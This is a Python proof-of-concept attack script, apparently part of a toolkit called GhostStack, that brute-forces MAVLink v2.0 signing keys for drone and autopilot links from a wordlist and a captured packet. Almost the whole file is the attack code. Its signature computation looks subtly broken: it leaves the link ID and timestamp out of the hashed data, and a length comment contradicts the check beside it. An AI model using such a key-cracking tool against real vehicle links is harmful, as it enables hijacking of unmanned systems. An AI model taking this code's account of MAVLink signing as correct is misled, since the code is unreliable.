import sys
from pymavlink import mavutil
import hashlib
import time

# GhostStack: Network Layer - MAVLink v2.0 Dictionary Attack (PoC)
#
# This script attempts to crack a MAVLink v2.0 message signature by
# brute-forcing a list of secret keys.
# 
# MAVLink v2.0 signatures use SHA-256 to hash the message data and a 
# secret key. If the system uses a weak or default key, it can be cracked.

def crack_signature(packet_bytes, dictionary_file):
    # A valid signed MAVLink 2.0 packet has a specific structure:
    # [STX(0xFD)] [LEN] [INC FLAGS] [CMP FLAGS] [SEQ] [SYSID] [COMPID] [MSGID (3 bytes)] [PAYLOAD] [CHECKSUM (2 bytes)] [SIGNATURE (13 bytes)]
    
    # Check if packet is large enough to contain a signature
    if len(packet_bytes) < 12 + 13: # Header(10) + Checksum(2) + Sig(13)
        print("[-] Packet too short to contain a valid signature.")
        return

    if packet_bytes[0] != 0xFD:
        print("[-] Not a MAVLink v2.0 packet (STX != 0xFD).")
        return

    incompat_flags = packet_bytes[2]
    if not (incompat_flags & 0x01):
        print("[-] Packet is not signed (Incompatibility Flag 0x01 is not set).")
        return

    # Extract signature (last 13 bytes)
    target_signature = packet_bytes[-13:]
    link_id = target_signature[0]
    timestamp_bytes = target_signature[1:7]
    provided_hash = target_signature[7:] # 6 bytes

    # The data to be hashed consists of the entire packet EXCEPT the signature itself
    data_to_hash = packet_bytes[:-13]

    print(f"[*] Attempting dictionary attack on packet...")
    print(f"    Link ID: {link_id}")
    print(f"    Target Hash (First 6 bytes): {provided_hash.hex()}")

    try:
        with open(dictionary_file, 'r', encoding='utf-8') as f:
            for line in f:
                secret_key = line.strip().encode('utf-8')
                
                # MAVLink 2.0 Hash Generation:
                # SHA-256(secret_key + data_to_hash)
                # The signature takes the first 6 bytes of this hash
                
                m = hashlib.sha256()
                m.update(secret_key)
                m.update(data_to_hash)
                
                generated_hash = m.digest()[:6]
                
                if generated_hash == provided_hash:
                    print(f"\n[+] SUCCESS! Key found: '{secret_key.decode('utf-8')}'")
                    return secret_key.decode('utf-8')
                    
        print("\n[-] Dictionary exhausted. Key not found.")
    except FileNotFoundError:
        print(f"[-] Dictionary file not found: {dictionary_file}")

    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 dictionary_attack.py <hex_packet_dump> <dictionary.txt>")
        print("Example: python3 dictionary_attack.py fd090100... wordlist.txt")
        sys.exit(1)

    packet_hex = sys.argv[1]
    dict_file = sys.argv[2]
    
    try:
        packet_bytes = bytes.fromhex(packet_hex)
        crack_signature(packet_bytes, dict_file)
    except ValueError:
        print("[-] Invalid hex string provided.")
